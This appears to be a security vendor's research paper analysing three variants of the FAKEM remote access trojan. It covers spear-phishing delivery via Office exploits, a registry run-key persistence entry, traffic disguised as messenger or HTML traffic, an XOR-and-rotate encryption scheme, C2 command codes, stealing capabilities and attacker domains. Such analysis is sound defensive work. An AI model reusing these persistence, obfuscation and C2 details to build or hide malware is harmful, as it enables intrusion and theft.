Some variants attempt to disguise network traffic to look like Windows® Messenger and Yahoo ! ® Messenger traffic .
Another variant tries to make the content of its traffic look like HTML .
While the disguises the RATs use are simple and distinguishable from legitimate traffic , they may be just good enough to avoid further scrutiny .
All three versions of the FAKEM RAT that we investigated were distributed via spear - phishing emails using social engineering to lure targets into executing a malicious attachment .
While we observed the use of different themes , the content of the emails were always interesting to potential targets .
The malicious attachments were most often Microsoft® Word® documents with code that exploits the following vulnerabilities : • CVE-2010 - 3333 : RTF Stack Buffer Overflow Vulnerability addressed in Microsoft Security Bulletin MS10 - 087.3 • CVE-2012 - 0158 : MSCOMCTL.OCX RCE Vulnerability addressed in Microsoft Security Bulletin MS12 - 027.4 We also found a Microsoft® Excel® file that exploits CVE-2009 - 3129 , the Excel Featheader Record Memory Corruption Vulnerability addressed in Microsoft Security Bulletin MS09 - 067.5 We also saw samples that were simply executable ( .EXE
) files .
After exploitation , an .EXE
file packed with UPX is dropped.6 After initially dropping the malicious file named hkcmd.exe to the % Temp % folder , the malware typically copies itself using the name , tpframe.exe , to the % System % folder .
It then adds the following registry entry to enable its automatic execution at every system startup : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\policies\Explorer\run tpbar = `` % System % \tpframe.exe '' The network traffic the malware produces is designed to look like Windows Messenger traffic .
Malware of this type were discussed on Twitter , noted by SonicWALL , and found to have been active as far back as September 2009.7 However , it remains unclear if all the attacks that used this malware were connected .
The malicious traffic begins with headers similar to actual Windows Messenger traffic : MSG 5 N 130 MIME - Version : 1.0 However , beyond this , you will see that the traffic is not valid Windows Messenger traffic but may be sufficiently disguised as such to escape further scrutiny .
traffic < /caption > Compared with actual Windows Messenger traffic shown in Figure 3 , it is easy to distinguish the malicious traffic shown in Figure 2 .
During our investigation of the fake `` Windows Messenger '' RAT , we found another version that attempts to disguise its network traffic as Yahoo ! Messenger traffic .
The network communication this version uses begins with YMSG , the Yahoo ! Messenger traffic header .
traffic < /caption > However , the network traffic shown in Figure 4 does not resemble legitimate Yahoo ! Messenger traffic beyond the use of the header , YMSG .
Compared with the legitimate Yahoo ! Messenger traffic shown in Figure 5 , it is easy to distinguish between the two .
A third version of the FAKEM RAT attempts to disguise the network traffic it produces as HTML .
The malicious traffic begins with strings like < html > < title > 1 .. 56 < /title > < body > or < html > < title > 12356 < /title > < body > .8
This is a fairly rudimentary disguise and odd because you would expect HTML to be the result of a request to a web server and not as something a client would send to a web server .
The network communication between the compromised computer and the RAT controller is encrypted .
The encryption is the same across variants and done at the bit level .
Each byte is XOR - ed by every letter in the string , YHCRA , and rotated 3 bits to the right after every XOR operation .
Encrypting the communication ensures that the suspicious data passed between the compromised host and the attackers can not be easily viewed in plain text .
The communication comes in 1024-byte blobs of data that start with the 32-byte header .
It appears that attackers may specify any kind of fake headers within the first 32 bytes in order to disguise the subsequent network traffic .
The following bits of information are initially sent by the compromised host when the communication starts : • User name • Computer name • OEM code page identifier • What looks like a campaign code but only for some samples The commands are not preconfigured as the malware relies on the data sent by the server .
For instance , when a client receives the command , 0211 , this signifies that it should execute the accompanying data in memory .
The following are the commands the server issues and their meanings : • 0211 : Execute code .
• 0212 : Reconnect to receive data .
• 0213 : Sleep , close socket , and reconnect .
• 0214 : Exit .
To determine the RAT 's capabilities , we allowed the attackers to infiltrate a honeypot computer and captured all of the network traffic it generated .
We decrypted the network traffic and determined the commands the attackers used , which include : • CmdMana : Command Manager allows attackers to execute shell commands .
• FileMan : File Manager allows the attackers to browse directories .
• HostIn : Host Information provides information about the compromised computer .
• ProcMan : Process Manager gives attackers access to running processes .
• RegMana : Registry Manager gives attackers access to the Windows registry .
• Scree : Screen takes a snapshot of the desktop .
• ServiceMa : Service Manager allows access to services .
• Passwo : Password accesses stored passwords like those saved in Internet Explorer ( IE ) .
• UStea : Uploads files from a compromised computer .
The Windows Messenger samples we analyzed were clustered into five groups that did not have overlapping linkages .
Four of the clusters were relatively small and focused on four different domains : • vcvcvcvc.dyndns.org • zjhao.dtdns.net • avira.suroot.com • * .googmail.com The vcvcvcvc.dyndns.org domain is particularly interesting because we also found it being used as a command - and - control ( C & C ) server for Protux - a well- known malware family that has been used in many targeted attacks over the years .
We also found that the avira.suroot.com domain used as a C & C server for yet another malware family we call `` cxgid .
'' The * .googmail.com domain was slightly larger and included names like apple12.crabdance.com and apple12.co.cc .
However , the largest cluster revolved around the * .yourturbe.org domain and overlapped with the HTML variant .
We also found small clusters of the HTML variant that revolved around the domain , endless.zapto.org , which was downloaded as a second - stage malware by Protux .
Meanwhile , the Yahoo ! Messenger samples we analyzed all accessed freeavg .
sytes.net-a domain name that frequently resolved to different IP addresses .
The various samples we collected appear to belong to groups that overlapped a little .
This suggests that rather than being associated with a particular campaign , the use of various FAKEM RATs could be distributed among multiple threat actors .
Knowledge of the attack tools , techniques , and infrastructure of adversaries is critical for developing defensive strategies .
This research paper examined three variants of a RAT - FAKEM - that attempt to disguise the network traffic they produce to stay under the radar .
Now that popular RATs like Gh0st and PoisonIvy have become well - known and can easily be detected , attackers are looking for methods to blend in with legitimate traffic .
While it is possible to distinguish the network traffic FAKEM RAT variants produce for the legitimate protocols they aim to spoof , doing so in the context of a large network may not be not easy .
The RAT 's ability to mask the traffic it produces may be enough to provide attackers enough cover to survive longer in a compromised environment .
Fortunately , solutions like Trend Micro™ Deep Discovery can help network administrators protect their organizations from attacks that use the FAKEM RAT by detecting the traffic its variants produce .
